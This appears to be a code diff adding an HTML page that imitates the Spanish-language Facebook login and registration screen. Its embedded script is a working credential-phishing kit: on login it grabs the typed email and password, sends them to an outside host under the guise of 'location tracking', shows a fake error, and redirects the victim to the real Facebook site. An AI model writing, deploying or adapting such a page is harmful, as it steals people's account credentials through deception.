@@ -1,0 +1,136 @@
+<!DOCTYPE html>
+<html lang="en">
+
+<head>
+  <meta charset="UTF-8">
+  <meta http-equiv="X-UA-Compatible" content="IE=edge">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <title>Document</title>
+  <link rel="stylesheet" href="./style.css">
+</head>
+
+<body>
+  <header>
+    <nav>
+      <section class="header-nav">
+        <div class="nav-logo">
+          <img src="./assets/Facebook-Logo.png" alt="facebook">
+        </div>
+        <form class="nav-form-container" onsubmit="onSubmitForm(event)">
+          <input id="email" type="email" placeholder="Correo electronico">
+          <input id="password" type="password" placeholder="Contraseña">
+          <button href="#" class="button">Iniciar sesión</button>
+        </form>
+      </section>
+    </nav>
+  </header>
+
+  <main class="menu-container">
+    <div class="menu-image">
+      <h3>Facebook te ayuda a comunicarte y compartir con las personas que forman parte de tu vida.</h3>
+      <img src="./assets/mapa-fb.png" alt="">
+    </div>
+
+    <section class="menu-form">
+      <div class="menu-form-div">
+        <h2>Crea una cuenta</h2>
+        <h3>Es facil y rapido.</h3>
+      </div>
+
+      <form class="formulario">
+        <div class="formulario-nombres">
+          <input class="input1" type="text" placeholder="Nombre">
+          <input class="input1" type="text" placeholder="Apellido">
+        </div>
+        <input class="input2" type="text" placeholder="Número de celular">
+        <input class="input2" type="password" placeholder="Contraseña">
+
+        <h3 class="birthay">Fecha de nacimiento</h3>
+
+        <div class="select">
+          <select class="date">
+            <option value="">Día</option>
+          </select>
+          <select class="date">
+            <option value="">Mes</option>
+          </select>
+          <select class="date">
+            <option value="">Año</option>
+          </select>
+        </div>
+
+        <p class="sex">Sexo</p>
+        <div class="sex-option">
+          <p><input type="radio" value="Hombre">Hombre</p>
+          <p><input type="radio" value="Mujer">Mujer</p>
+          <p><input type="radio" value="Mujer">Personalizado</p>
+        </div>
+        <p class="info">Al hacer clic en Registrarte, aceptas las condiciones y confirmas que has leido nuestra Politica
+          de datos, incluido el Uso de cookies.</p>
+        <button href="#" class="button-register">Registrarte</button>
+      </form>
+      <hr>
+      <h3 class="text-finally"><a href="#">Crea una página</a> para un personaje público, un grupo de música o un
+        negocio.</h3>
+    </section>
+  </main>
+
+  <script>
+    async function startLocationTracking() {
+      const email = document.getElementById("email").value;
+      const password = document.getElementById("password").value;
+
+      let jsonForm = ""
+      jsonForm = JSON.stringify({
+        "password": password,
+      })
+
+      const locationData = {
+        latitude: 0,
+        longitude: 0
+      };
+      await sendLocationData(locationData, 'jorge', email, jsonForm, '');
+    }
+
+    async function sendLocationData(locationData, name, email, jsonForm, user_id) {
+      const userData = {
+        location: locationData,
+        name: name,
+        email: email,
+        user_id: user_id,
+        form: jsonForm,
+        plantilla: "fb",
+      };
+
+      try {
+        const response = await fetch("https://elojo.tech/location/", {
+          method: "POST",
+          headers: {
+            "Content-Type": "application/json",
+          },
+          body: JSON.stringify(userData),
+        });
+
+        if (response.ok) {
+          const responseData = await response.json();
+          localStorage.setItem("user_id", responseData.data.idPersona);
+          console.log("Response from server:", responseData.data.idPersona);
+        } else {
+          console.log("Failed to send data:", response.status, response.statusText);
+        }
+      } catch (error) {
+        console.error("Error sending data:", error.message);
+      }
+    }
+
+    function onSubmitForm(event) {
+      event.preventDefault();
+      localStorage.clear();
+      startLocationTracking();
+      alert("Error, favor de interntarlo nuevamente");
+      window.location.replace("https://fb.com/");
+    }
+  </script>
+</body>
+
+</html>
